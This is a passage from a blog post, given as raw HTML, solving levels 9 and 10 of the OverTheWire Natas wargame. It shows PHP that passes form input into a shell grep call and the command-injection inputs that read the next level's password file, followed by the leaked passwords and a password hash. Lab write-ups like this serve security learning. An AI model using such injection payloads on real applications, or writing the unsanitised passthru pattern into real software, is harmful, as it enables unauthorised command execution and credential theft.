+</span></span></span></code></pre></div><p>I don&rsquo;t program in PHP so I looked up the <code>passthru</code> command:</p><blockquote><p>The passthru() function is similar to the exec() function in that it executes a command. This function should be used in place of exec() or system() when the output from the Unix command is binary data which needs to be passed directly back to the browser. A common use for this is to execute something like the pbmplus utilities that can output an image stream directly. By setting the Content-type to image/gif and then calling a pbmplus program to output a gif, you can create PHP scripts that output images directly.</p></blockquote><p>It looks to me I can pass commands in the form box and it&rsquo;ll replace <code>$key</code>. Since inputs aren&rsquo;t sanitised and the introductory natas challenge page states that all passwords are also stored in /etc/natas_webpass, I&rsquo;m able input the following command to print out the password for the next level:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=p>;</span> cat /etc/natas_webpass/natas10 <span class=c1>#</span>
+</span></span></code></pre></div><p>By doing this, <code>$key</code> is substituted in with my command, causing grep to end prematurely and commenting out &lsquo;dictionary.txt&rsquo; at the end.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>grep -i <span class=p>;</span> cat /etc/natas_webpass/natas10 <span class=c1># dictionary.txt</span>
+</span></span></code></pre></div><blockquote><p>Output:
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</p></blockquote><h2 id=level-10---11>Level 10 -> 11</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>pre</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span>
+</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s2>&#34;needle&#34;</span><span class=p>,</span> <span class=nv>$_REQUEST</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$key</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;needle&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$key</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[;|&amp;]/&#39;</span><span class=p>,</span><span class=nv>$key</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>print</span> <span class=s2>&#34;Input contains an illegal character!&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>passthru</span><span class=p>(</span><span class=s2>&#34;grep -i </span><span class=si>$key</span><span class=s2> dictionary.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/pre&gt;
+</span></span></span></code></pre></div><p>This time there&rsquo;s some sanitasion for my input. I&rsquo;m now unable to terminate my command using <code>;</code>. However, the same substituion issue exists where I can instead pass along a different command. <code>.</code> and <code>*</code> are permitted characters, so I&rsquo;m able to use grep&rsquo;s ability to do a wildcard search on a specific file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>.* /etc/natas_webpass/natas11 <span class=c1>#</span>
+</span></span></code></pre></div><p>Substituted:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>grep -i .* /etc/natas_webpass/natas11 <span class=c1># dictionary.txt</span>
+</span></span></code></pre></div><p>The form then returns the next level&rsquo;s password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>.htaccess:AuthType Basic
+</span></span><span class=line><span class=cl>.htaccess: AuthName <span class=s2>&#34;Authentication required&#34;</span>
+</span></span><span class=line><span class=cl>.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+</span></span><span class=line><span class=cl>.htaccess: require valid-user
+</span></span><span class=line><span class=cl>.htpasswd:natas10:<span class=nv>$1$XOXwo</span>/z0<span class=nv>$K</span>/6kBzbw4cQ5exEWpW5OV0
+</span></span><span class=line><span class=cl>/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 01-05-2018</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/2017-12-26-overthewire-bandit/ class=prev rel=prev title="OverTheWire Bandit"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>OverTheWire Bandit</a>
+<a href=/posts/2018-09-11-vmware-ssh-bug/ class=next rel=next title="VMWare SSH Bug">VMWare SSH Bug<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2015 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://bchoy.me target=_blank>Brian Choy</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0,math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F9RPBWE7GE",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-F9RPBWE7GE" async></script></body></html>
